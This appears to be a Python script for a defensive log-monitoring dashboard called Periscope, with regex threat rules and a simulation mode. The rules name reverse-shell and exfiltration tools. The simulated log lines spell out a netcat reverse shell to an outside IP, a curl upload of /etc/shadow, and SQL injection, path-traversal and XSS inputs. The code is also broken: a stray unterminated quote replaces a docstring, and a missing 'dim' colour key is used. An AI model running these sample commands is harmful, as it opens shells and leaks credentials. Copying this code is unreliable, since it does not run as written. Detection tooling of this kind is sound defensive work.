#!/usr/bin/env python3

import asyncio
import re
import json
import hashlib
from datetime import datetime
from pathlib import Path
from typing import Dict, List, Optional
from collections import defaultdict
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.live import Live
from rich.layout import Layout
from rich import box

console = Console()

# Defensive color palette
COLORS = {
    'critical': 'bold red on black',
    'high': 'bold red',
    'medium': 'bold yellow',
    'low': 'bold cyan',
    'info': 'dim white',
    'success': 'bold green',
    'warning': 'bold magenta',
    'border': 'bright_blue',
    'header': 'bold white on blue',
    'ip': 'cyan',
    'timestamp': 'dim yellow',
}

# Threat detection patterns
THREAT_PATTERNS = {
    'brute_force_ssh': {
        'pattern': r'Failed password|authentication failure|Invalid user',
        'threshold': 5,
        'window': 60,
        'severity': 'HIGH',
        'description': 'Possible SSH brute force attack'
    },
    'sql_injection': {
        'pattern': r"(?i)(union\s+select|or\s+1\s*=\s*1|'\s*or\s*'|drop\s+table|;\s*--|/\*.*\*/)",
        'threshold': 1,
        'window': 300,
        'severity': 'CRITICAL',
        'description': 'SQL Injection attempt detected'
    },
    'xss_attempt': {
        'pattern': r"(?i)(<script|javascript:|onerror\s*=|onload\s*=|<iframe|<img.*onerror)",
        'threshold': 1,
        'window': 300,
        'severity': 'HIGH',
        'description': 'XSS attack attempt detected'
    },
    'path_traversal': {
        'pattern': r'(\.\./|\.\.\\|%2e%2e%2f|%252e%252e%252f)',
        'threshold': 1,
        'window': 300,
        'severity': 'HIGH',
        'description': 'Path traversal attempt detected'
    },
    'port_scan': {
        'pattern': r'(port scan|nmap|masscan|connection refused.*multiple)',
        'threshold': 3,
        'window': 120,
        'severity': 'MEDIUM',
        'description': 'Possible port scanning activity'
    },
    'privilege_escalation': {
        'pattern': r'(sudo|su -|pkexec|polkit|root access|privilege)',
        'threshold': 10,
        'window': 300,
        'severity': 'MEDIUM',
        'description': 'Privilege escalation activity detected'
    },
    'malware_indicator': {
        'pattern': r'(reverse shell|nc -e|/bin/bash -i|powershell.*-enc|base64.*-d)',
        'threshold': 1,
        'window': 600,
        'severity': 'CRITICAL',
        'description': 'Potential malware/C2 activity'
    },
    'data_exfiltration': {
        'pattern': r'(curl.*post|wget.*upload|scp|rsync.*remote|large outbound)',
        'threshold': 5,
        'window': 300,
        'severity': 'HIGH',
        'description': 'Possible data exfiltration detected'
    }
}

class SecurityEvent:
    
    def __init__(self, timestamp: datetime, source: str, event_type: str, 
                 severity: str, details: str, source_ip: str = None):
        self.id = hashlib.md5(f"{timestamp}{details}".encode()).hexdigest()[:8]
        self.timestamp = timestamp
        self.source = source
        self.event_type = event_type
        self.severity = severity
        self.details = details
        self.source_ip = source_ip
        self.acknowledged = False

class Periscope:
    def __init__(self, log_paths: List[str] = None, alert_threshold: str = 'MEDIUM'):
        self.log_paths = log_paths or []
        self.alert_threshold = alert_threshold
        self.events: List[SecurityEvent] = []
        self.alerts: List[SecurityEvent] = []
        self.stats = defaultdict(int)
        self.ip_tracking = defaultdict(list)
        self.running = False
        self.start_time = datetime.now()
        
        # Alert thresholds
        self.severity_order = {'LOW': 1, 'MEDIUM': 2, 'HIGH': 3, 'CRITICAL': 4}
        self.threshold_level = self.severity_order.get(alert_threshold, 2)

    def parse_log_line(self, line: str, source: str) -> Optional[SecurityEvent]:
       "
        line = line.strip()
        if not line:
            return None
        
        timestamp = datetime.now()
        source_ip = self._extract_ip(line)
        
        # Detect threat patterns
        for threat_name, config in THREAT_PATTERNS.items():
            if re.search(config['pattern'], line, re.IGNORECASE):
                event = SecurityEvent(
                    timestamp=timestamp,
                    source=source,
                    event_type=threat_name,
                    severity=config['severity'],
                    details=line[:200],
                    source_ip=source_ip
                )
                return event
        
        # Normal info event
        return SecurityEvent(
            timestamp=timestamp,
            source=source,
            event_type='info',
            severity='LOW',
            details=line[:200],
            source_ip=source_ip
        )

    def _extract_ip(self, text: str) -> Optional[str]:
        """Extract IP address from text"""
        ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
        match = re.search(ip_pattern, text)
        return match.group(0) if match else None

    def _check_ip_reputation(self, ip: str) -> str:
         # simulated
        if not ip:
            return 'unknown'
        
        # Private IPs
        if ip.startswith(('10.', '192.168.', '172.16.')):
            return 'internal'
        
        # Simulated threat intel
        suspicious_ranges = ['45.', '185.', '91.']
        if any(ip.startswith(r) for r in suspicious_ranges):
            return 'suspicious'
        
        return 'unknown'

    def process_event(self, event: SecurityEvent):
        # Process event and generate alerts if needed(Better safe than sorry )

        self.events.append(event)
        self.stats[event.event_type] += 1
        
        # IP tracking
        if event.source_ip:
            self.ip_tracking[event.source_ip].append(event)
        
        # Generate alert if above threshold
        if self.severity_order.get(event.severity, 0) >= self.threshold_level:
            if event.source_ip:
                ip_events = [e for e in self.ip_tracking[event.source_ip] 
                            if e.event_type == event.event_type]
                pattern_config = THREAT_PATTERNS.get(event.event_type, {})
                threshold = pattern_config.get('threshold', 1)
                
                if len(ip_events) >= threshold:
                    self.alerts.append(event)
        
        # Memory limits
        if len(self.events) > 1000:
            self.events = self.events[-500:]
        if len(self.alerts) > 100:
            self.alerts = self.alerts[-50:]


    def _create_header(self) -> Panel:
        uptime = datetime.now() - self.start_time
        uptime_str = str(uptime).split('.')[0]
        
        header = Text()
        header.append("Periscope ", style=COLORS['header'])
        header.append("v1.0", style=COLORS['info'])
        header.append(f"  |  Uptime: {uptime_str}", style=COLORS['timestamp'])
        header.append(f"  |  Events: {len(self.events)}", style=COLORS['info'])
        header.append(f"  |  Alerts: {len(self.alerts)}", style=COLORS['warning'])
        
        return Panel(
            header,
            title="SECURITY OPERATIONS CENTER",
            subtitle="Threat Visibility • Active Monitoring",
            border_style=COLORS['border'],
            box=box.DOUBLE_EDGE,
            padding=(0, 2)
        )

    def _create_alerts_table(self) -> Table:
         # alerts table
        table = Table(
            title=" ACTIVE ALERTS",
            title_style=COLORS['warning'],
            show_header=True,
            header_style=COLORS['header'],
            box=box.ROUNDED,
            border_style=COLORS['border'],
            expand=True,
            min_width=60
        )
        table.add_column("Time", style=COLORS['timestamp'], width=8)
        table.add_column("Severity", style=COLORS['warning'], width=10)
        table.add_column("Type", style=COLORS['ip'], width=20)
        table.add_column("Source IP", style=COLORS['ip'], width=15)
        table.add_column("Details", style=COLORS['info'], ratio=1)
        
        # Show last 5 alerts
        for alert in reversed(self.alerts[-5:]):
            severity_style = COLORS.get(alert.severity.lower(), COLORS['info'])
            time_str = alert.timestamp.strftime('%H:%M:%S')
            table.add_row(
                time_str,
                f"[{severity_style}]{alert.severity}[/{severity_style}]",
                alert.event_type,
                alert.source_ip or 'N/A',
                alert.details[:50] + '...' if len(alert.details) > 50 else alert.details
            )
        
        if not self.alerts:
            table.add_row('-', '-', '-', '-', '[dim]No active alerts[/dim]')
        
        return table

    def _create_stats_panel(self) -> Panel:
        # Statistics panel 
        stats_text = Text()
        stats_text.append("EVENT STATISTICS\n\n", style=COLORS['header'])
        
        # Top event types
        sorted_stats = sorted(self.stats.items(), key=lambda x: x[1], reverse=True)[:5]
        
        for event_type, count in sorted_stats:
            severity = THREAT_PATTERNS.get(event_type, {}).get('severity', 'LOW')
            color = COLORS.get(severity.lower(), COLORS['info'])
            stats_text.append(f"  {event_type}: ", style=COLORS['info'])
            stats_text.append(f"{count}\n", style=color)
        
        if not sorted_stats:
            stats_text.append("  No events recorded yet\n", style=COLORS['dim'])
        
        # IP tracking
        stats_text.append("\n TOP SOURCE IPS\n\n", style=COLORS['header'])
        ip_counts = [(ip, len(events)) for ip, events in self.ip_tracking.items()]
        ip_counts.sort(key=lambda x: x[1], reverse=True)
        
        for ip, count in ip_counts[:3]:
            reputation = self._check_ip_reputation(ip)
            rep_color = COLORS['warning'] if reputation == 'suspicious' else COLORS['info']
            stats_text.append(f"  {ip}: ", style=COLORS['ip'])
            stats_text.append(f"{count} events ", style=COLORS['info'])
            stats_text.append(f"[{reputation}]\n", style=rep_color)
        
        if not ip_counts:
            stats_text.append("  No IPs tracked yet\n", style=COLORS['dim'])
        
        return Panel(
            stats_text,
            title="ANALYTICS",
            border_style=COLORS['border'],
            box=box.ROUNDED,
            padding=(1, 2)
        )

    def _create_threat_map(self) -> Panel:
        # Create threat distribution map
        threat_text = Text()
        threat_text.append(" THREAT LANDSCAPE\n\n", style=COLORS['header'])
        
        # Count by severity
        severity_counts = defaultdict(int)
        for event in self.events:
            severity_counts[event.severity] += 1
        
        total = sum(severity_counts.values()) or 1
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            count = severity_counts.get(severity, 0)
            percentage = (count / total) * 100
            bar_length = int(percentage / 5)
            color = COLORS.get(severity.lower(), COLORS['info'])
            
            threat_text.append(f"  {severity:10}", style=COLORS['info'])
            threat_text.append("█" * bar_length, style=color)
            threat_text.append(f" {count} ({percentage:.1f}%)\n", style=COLORS['dim'])
        
        return Panel(
            threat_text,
            title=" THREAT DISTRIBUTION",
            border_style=COLORS['border'],
            box=box.ROUNDED,
            padding=(1, 2)
        )

    def _create_live_feed(self) -> Panel:
        # Create live event feed
        feed_text = Text()
        feed_text.append("LIVE EVENT FEED\n\n", style=COLORS['header'])
        
        # Last 8 events
        for event in reversed(self.events[-8:]):
            time_str = event.timestamp.strftime('%H:%M:%S')
            severity_color = COLORS.get(event.severity.lower(), COLORS['info'])
            
            feed_text.append(f"[{time_str}] ", style=COLORS['timestamp'])
            feed_text.append(f"[{event.severity}] ", style=severity_color)
            feed_text.append(f"{event.event_type[:15]:15}", style=COLORS['ip'])
            feed_text.append(f"{event.details[:40]}...\n", style=COLORS['dim'])
        
        if not self.events:
            feed_text.append("  Waiting for events...\n", style=COLORS['dim'])
        
        return Panel(
            feed_text,
            title=" REAL-TIME MONITORING",
            border_style=COLORS['border'],
            box=box.ROUNDED,
            padding=(1, 2)
        )

    def _create_footer(self) -> Panel:
        footer = Text()
        footer.append("Status: ", style=COLORS['info'])
        footer.append("MONITORING ACTIVE", style=COLORS['success'])
        footer.append("  |  Log Sources: ", style=COLORS['info'])
        footer.append(f"{len(self.log_paths)}", style=COLORS['warning'])
        footer.append("  |  Rules Loaded: ", style=COLORS['info'])
        footer.append(f"{len(THREAT_PATTERNS)}", style=COLORS['success'])
        
        return Panel(
            footer,
            border_style=COLORS['border'],
            box=box.SIMPLE,
            padding=(0, 2)
        )

    def _create_layout(self) -> Layout:
    
        layout = Layout()
        
        layout.split(
            Layout(name="header", size=3),
            Layout(name="body"),
            Layout(name="footer", size=3)
        )
        
        layout["body"].split_row(
            Layout(name="left", ratio=2),
            Layout(name="right", ratio=1)
        )
        
        layout["left"].split(
            Layout(name="alerts", size=10),
            Layout(name="feed")
        )
        
        layout["right"].split(
            Layout(name="stats"),
            Layout(name="threats")
        )
        
        # Update content
        layout["header"].update(self._create_header())
        layout["alerts"].update(self._create_alerts_table())
        layout["feed"].update(self._create_live_feed())
        layout["stats"].update(self._create_stats_panel())
        layout["threats"].update(self._create_threat_map())
        layout["footer"].update(self._create_footer())
        
        return layout

    async def monitor_logs(self):
        self.running = True
        console.print(f"\n[{COLORS['success']}][+][/{COLORS['success']}] Starting Periscope monitoring...\n")
        
        # File positions to read from end
        file_positions = {}
        
        with Live(self._create_layout(), refresh_per_second=2, screen=True) as live:
            while self.running:
                # Read new events from each log
                for log_path in self.log_paths:
                    try:
                        path = Path(log_path)
                        if not path.exists():
                            continue
                        
                        current_pos = file_positions.get(str(path), 0)
                        
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            f.seek(current_pos)
                            new_lines = f.readlines()
                            file_positions[str(path)] = f.tell()
                        
                        for line in new_lines:
                            event = self.parse_log_line(line, log_path)
                            if event:
                                self.process_event(event)
                    except Exception:
                        pass  # Silent file errors
                
                # Update dashboard
                live.update(self._create_layout())
                await asyncio.sleep(1)

    async def simulate_events(self, duration: int = 30):
        
        self.running = True
        console.print(f"\n[{COLORS['success']}][+][/{COLORS['success']}] Starting simulation mode...\n")
        
        sample_events = [
            ("192.168.1.100", "Failed password for invalid user admin from 192.168.1.100"),
            ("192.168.1.100", "Failed password for invalid user root from 192.168.1.100"),
            ("10.0.0.50", "GET /search?q=' OR 1=1 -- HTTP/1.1"),
            ("45.33.32.156", "GET /../../etc/passwd HTTP/1.1"),
            ("192.168.1.25", "sudo: user : TTY=pts/0 ; PWD=/home ; COMMAND=/bin/bash"),
            ("185.220.101.45", "nc -e /bin/bash 185.220.101.45 4444"),
            ("10.0.0.100", "curl -X POST https://external.com/upload   -d @/etc/shadow"),
            ("192.168.1.100", "Failed password for invalid user test from 192.168.1.100"),
            ("45.33.32.156", "<script>alert('XSS')</script>"),
            ("10.0.0.50", "Normal user login successful"),
        ]
        
        with Live(self._create_layout(), refresh_per_second=2, screen=True) as live:
            for i in range(duration):
                # Add random event
                if sample_events:
                    ip, log_line = sample_events[i % len(sample_events)]
                    event = self.parse_log_line(log_line, 'simulation')
                    if event:
                        self.process_event(event)
                
                live.update(self._create_layout())
                await asyncio.sleep(1)
        
        self.running = False

    def stop(self):
        # Stop monitoring
        self.running = False

    def generate_report(self) -> str:
        report = []
        report.append("=" * 60)
        report.append("Periscope v1.0 - Security Report")
        report.append("=" * 60)
        report.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"Uptime: {datetime.now() - self.start_time}")
        report.append("")
        
        report.append("[+] SUMMARY")
        report.append(f"    Total Events: {len(self.events)}")
        report.append(f"    Total Alerts: {len(self.alerts)}")
        report.append(f"    Unique IPs: {len(self.ip_tracking)}")
        report.append("")
        
        report.append("[!] CRITICAL ALERTS")
        for alert in self.alerts:
            if alert.severity == 'CRITICAL':
                report.append(f"    [{alert.timestamp}] {alert.event_type}: {alert.details[:80]}")
        report.append("")
        
        report.append("[>] TOP THREAT SOURCES")
        ip_counts = [(ip, len(events)) for ip, events in self.ip_tracking.items()]
        for ip, count in sorted(ip_counts, key=lambda x: x[1], reverse=True)[:5]:
            report.append(f"    {ip}: {count} events")
        
        return '\n'.join(report)


async def main():
    import argparse
    
    parser = argparse.ArgumentParser(
        description=" Periscope v1.0 - Security Information & Event Management",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --simulate                    # Demonstration mode
  %(prog)s /var/log/auth.log             # Monitor SSH logs
  %(prog)s /var/log/apache2/access.log   # Monitor web logs
  %(prog)s /var/log/syslog --threshold HIGH  # High-severity alerts only
        """
    )
    
    parser.add_argument('logs', nargs='*', help='Log files to monitor')
    parser.add_argument('--simulate', action='store_true', 
                       help='Simulation mode with example events')
    parser.add_argument('--threshold', choices=['LOW', 'MEDIUM', 'HIGH', 'CRITICAL'],
                       default='MEDIUM', help='Minimum alert level (default: %(default)s)')
    parser.add_argument('--duration', type=int, default=30,
                       help='Simulation duration in seconds (default: %(default)s)')
    parser.add_argument('--report', action='store_true',
                       help='Generate report on exit')
    
    args = parser.parse_args()
    
    periscope = Periscope(log_paths=args.logs, alert_threshold=args.threshold)
    
    try:
        if args.simulate or not args.logs:
            # Simulation mode
            await periscope.simulate_events(duration=args.duration)
        else:
            # Real monitoring
            await periscope.monitor_logs()
    except KeyboardInterrupt:
        console.print(f"\n[{COLORS['warning']}][!][/{COLORS['warning']}] Monitoring interrupted by user")
    finally:
        periscope.stop()
        
        # Generate report (if requested)
        if args.report:
            report = periscope.generate_report()
            console.print("\n" + report)
            
            # Save to file
            report_path = Path(f"periscope_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
            report_path.write_text(report)
            console.print(f"\n[{COLORS['success']}][+][/{COLORS['success']}] Report saved to: {report_path}")


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        console.print(f"[bold red][!] Fatal error: {e}[/bold red]")
